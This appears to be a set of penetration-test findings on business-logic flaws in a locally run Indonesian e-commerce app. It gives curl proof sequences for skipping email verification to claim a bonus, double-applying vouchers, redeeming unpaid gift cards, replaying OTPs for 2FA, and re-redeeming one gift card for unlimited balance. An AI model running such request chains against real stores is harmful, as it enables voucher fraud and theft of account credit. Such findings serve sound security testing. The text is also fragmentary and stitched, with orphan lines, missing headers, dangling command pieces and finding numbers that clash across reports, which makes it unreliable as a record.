  FLOW-001 — Email Verification Step Skip in Registration                                                                                                                         
                                                                                                                                                                                  
  Vulnerability Type: Skip
  Severity: High                                                                                                                                                                    
  Business Impact: Users can complete registration and claim the welcome bonus (Rp 20,000 voucher + 100 loyalty points) without ever verifying ownership of the provided email
  address. Fraudulent accounts can be bulk-created using any email addresses.                                                                                                       
                                                                                                                                                                                  
  Intended flow:                                                                                                                                                                    
  register → verify-email → select-role → complete-profile → claim-welcome-bonus                                                                                                  
                                                                                                                                                                                  
  Bypassed flow:                                                                                                                                                                    
  register → select-role → complete-profile → claim-welcome-bonus                                                                                                                   
                   (verify-email SKIPPED)                                                                                                                                           
                                                                                                                                                                                    
  Proof:                                                                                                                                                                            
  # Step 1: Register (email_verified = false)                                                                                                                                     
  curl -s -X POST http://localhost:5002/api/auth/register \                                                                                                                         
    -H "Content-Type: application/json" \                                                                                                                                           
    -d '{"email":"skipver@test.com","password":"Test1234!","name":"SkipVerify","phone":"08111111111"}'                                                                              
  # → token: f8010728-ac86-4fbd-b147-4a3c846fe6de                                                                                                                                   
                                                                                                                                                                                    
  # Step 2: Skip verify-email entirely — go directly to select-role                                                                                                                 
  curl -s -X POST http://localhost:5002/api/auth/select-role \                                                                                                                      
    -H "Authorization: Bearer f8010728-ac86-4fbd-b147-4a3c846fe6de" \                                                                                                               
    -H "Content-Type: application/json" \                                                                                                                                           
    -d '{"role":"buyer"}'                                                                                                                                                           
  # → {"message": "Role set to buyer", "success": true}                                                                                                                           
                                                                                                                                                                                    
  # Step 3: Complete profile                                                                                                                                                      
  curl -s -X POST http://localhost:5002/api/auth/complete-profile \                                                                                                                 
    -H "Authorization: Bearer f8010728-ac86-4fbd-b147-4a3c846fe6de" \                                                                                                             
    -H "Content-Type: application/json" \                                                                                                                                           
    -d '{"date_of_birth":"1990-01-01","full_address":"123 Test","city":"Jakarta","postal_code":"12345"}'                                                                          
  # → {"data": {"profile_complete": true}, "success": true}                                                                                                                         
                                                                                                                                                                                    
  # Step 4: Claim welcome bonus — succeeds despite email_verified = false                                                                                                           
  curl -s -X POST http://localhost:5002/api/auth/claim-welcome-bonus \                                                                                                              
    -H "Authorization: Bearer f8010728-ac86-4fbd-b147-4a3c846fe6de" \                                                                                                               
    -H "Content-Type: application/json" -d '{}'                                                                                                                                     
  # → {"data": {"voucher_code": "WELCOME-ZCOUZ85A", "loyalty_points_awarded": 100}, "success": true}                                                                              
                                                                                                                                                                                    
  # Confirm: email_verified is still false                                                                                                                                          
  curl -s http://localhost:5002/api/auth/me \                                                                                                                                       
    -H "Authorization: Bearer f8010728-ac86-4fbd-b147-4a3c846fe6de"                                                                                                                 
  # → {"email_verified": false, "loyalty_points": 100}

  multiples of the voucher value.                                                                                                                                                   
  
  Intended flow:                                                                                                                                                                    
  checkout/init → ... → apply-voucher (once) → payment/initiate → ...                                                                                                             
                                                                                                                                                                                    
  Proof:

    -H "Content-Type: application/json" \                                                                                                                                           
    -d '{"checkout_id":"CHK-0D3F67017B","voucher_code":"WELCOME-NQO9SQKO"}'                                                                                                         
  # → {"total": 70000, "discount_amount": 20000, "success": true}                                                                                                                   
                                                                                                                                                                                    
  # Apply SAME voucher second time on same checkout — accepted again:                                                                                                             
  curl -s -X POST http://localhost:5002/api/checkout/apply-voucher \

    -H "Content-Type: application/json" \

  # → {"total": 50000, "discount_amount": 20000, "success": true}

  # Confirmed in the final order record:                                                                                                                                            
  # "voucher_discount": 40000  (double-applied)

  Intended flow:                                                                                                                                                                    
  gift-cards/purchase → gift-cards/payment/initiate → gift-cards/payment/confirm → gift-cards/redeem                                                                              
                                                                                                                                                                                  
  Bypassed flow:                                                                                                                                                                    
  gift-cards/purchase → gift-cards/redeem

No payment made.

  FLOW-006 — Email Verification OTP Accepted for 2FA and Not Invalidated After Use                                                                                                  
                                                                                                                                                                                    
  Vulnerability Type: Replay / Reorder                                                                                                                                            
  Severity: Medium                                                                                                                                                                  
  Business Impact: The OTP issued at registration for email verification is (a) also accepted by the verify-2fa endpoint and (b) never invalidated — it can be submitted to       
  verify-2fa unlimited times. An attacker who intercepts a registration OTP can replay it indefinitely.                                                                             
                                                                                                                                                                                  
  Proof:                                                                                                                                                                            
  # Register: OTP 157374 issued for email verification                                                                                                                            
  curl -s -X POST http://localhost:5002/api/auth/register \                                                                                                                         
    -d '{"email":"tfa_test@test.com","password":"Test1234!","name":"TFATest","phone":"08333333333"}'                                                                                
  # → {"otp": "157374", "token": "413d23eb-..."}                                                                                                                                  
                                                                                                                                                                                    
  # Use OTP for email verification (consumed)                                                                                                                                       
  curl -s -X POST http://localhost:5002/api/auth/verify-email \                                                                                                                     
    -H "Authorization: Bearer 413d23eb-..." -d '{"otp":"157374"}'                                                                                                                   
  # → {"email_verified": true}                                                                                                                                                      
                                                                                                                                                                                    
  # REPLAY: Same OTP accepted by verify-2fa (different step)                                                                                                                      
  curl -s -X POST http://localhost:5002/api/auth/verify-2fa \                                                                                                                       
    -H "Authorization: Bearer 413d23eb-..." -d '{"otp":"157374"}'                                                                                                                 
  # → {"two_fa_verified": true}                                                                                                                                                     
                                                                                                                                                                                  
  # REPLAY again — still accepted (not invalidated)                                                                                                                                 
  curl -s -X POST http://localhost:5002/api/auth/verify-2fa \                                                                                                                       
    -H "Authorization: Bearer 413d23eb-..." -d '{"otp":"157374"}'                                                                                                                   
  # → {"two_fa_verified": true}

  #     "otp": "758117",

  #   }

  FLOW-008 — Gift Card Code Replayed After Redemption (Infinite Money)                                                                                                            
                                                                                                                                                                                    
  Vulnerability Type: Replay                                                                                                                                                      
  Severity: Critical                                                                                                                                                                
  Business Impact: A gift card code that has already been redeemed is not invalidated. It can be redeemed again and again indefinitely, generating unlimited account balance.

  2. Redeem it → balance +500,000                                                                                                                                                   
  3. Redeem the same code again → balance +500,000
  4. Repeat step 3 infinitely                                                                                                                                                       
                                                                                                                                                                                  
  Proof:

  # Second redemption of same code GC-T2A6CAZNQTLQ:

    -H "Authorization: Bearer 20a722f2-d68c-4f1f-b26d-ab8dbdd36eee" \                                                                                                               
    -H "Content-Type: application/json" \                                                                                                                                           
    -d '{"code":"GC-T2A6CAZNQTLQ"}'                                                                                                                                                 
  # → {"amount_added": 500000, "new_balance": 972600}

    -H "Authorization: Bearer 20a722f2-d68c-4f1f-b26d-ab8dbdd36eee" \                                                                                                               
    -H "Content-Type: application/json" \                                                                                                                                           
    -d '{"code":"GC-T2A6CAZNQTLQ"}'                                                                                                                                               
  # → {"amount_added": 500000, "new_balance": 1472600}                                                                                                                              
                                                                                                                                                                                    
  # Balance grows by Rp 500,000 on every call. No limit. No real money spent.

    -H "Content-Type: application/json" \

  # Returns: {"token":"c1fdaf74-...", "otp":"249201"}                                                                   
                                                                                                                        
  # Step 2: Skip verify-email, jump directly to complete-profile                                                        
  curl -s -X POST http://localhost:5003/api/auth/complete-profile \                                                     
    -H "Content-Type: application/json" \                                                                               
    -H "Authorization: Bearer c1fdaf74-122b-4c47-86a7-c3f5c0f67afd" \                                                   
    -d '{"full_address":"123 Hacker St","city":"Jakarta","postal_code":"12345","date_of_birth":"1990-01-01"}'           
  # Returns: {"data":{"profile_complete":true},"success":true}  ← EMAIL NEVER VERIFIED

  FINDING: FLOW-008

    -H "Authorization: Bearer a61e773e-b4af-4daa-8576-f03508465bfe" \

  FINDING: FLOW-009

  VULNERABILITY TYPE: Replay

  DESCRIPTION: A single-use voucher can be applied to multiple concurrent checkout sessions. The system does not lock   
  the voucher when it is applied to the first session, allowing it to be applied to additional sessions before any order
   is placed. When orders from multiple sessions complete, each receives the voucher discount, effectively multiplying  
  the voucher's value.                                            
                                                                                                                      
  SEVERITY: High                                                                                                      

  BUSINESS IMPACT: A 20,000 IDR welcome voucher applied to two checkouts produced a 40,000 IDR discount on the final    
  order (double the face value). An attacker who opens N concurrent checkout tabs can amplify any voucher N times before
   the first order locks it.                                                                                            
                                                                  
  PROOF:                                                                                                              
  # Apply the SAME voucher WELCOME-8ICUY6T4 to checkout CHK_A                                                         
  curl -s -X POST http://localhost:5004/api/checkout/apply-voucher \
    -H "Content-Type: application/json" \                                                                               
    -H "Authorization: Bearer 2778e872-90b9-4d4f-be13-8726c92de4d4" \
    -d '{"checkout_id":"CHK_A","voucher_code":"WELCOME-8ICUY6T4"}'                                                      
  # Returns: {"success":true,"data":{"discount_amount":20000,"total":55000}}                                            
                                                                                                                      
  # SAME voucher applied to concurrent checkout CHK-32B031B41A                                                          
  curl -s -X POST http://localhost:5004/api/checkout/apply-voucher \                                                    
    -H "Content-Type: application/json" \                                                                               
    -H "Authorization: Bearer 2778e872-90b9-4d4f-be13-8726c92de4d4" \                                                   
    -d '{"checkout_id":"CHK-32B031B41A","voucher_code":"WELCOME-8ICUY6T4"}'                                           
  # Returns: {"success":true,"data":{"discount_amount":20000,"total":75000}}                                            
  # SAME 20,000 IDR voucher accepted on TWO separate checkouts simultaneously                                           
                                                                                                                        
  # Final order showed voucher_discount: 40000 — double the voucher face value
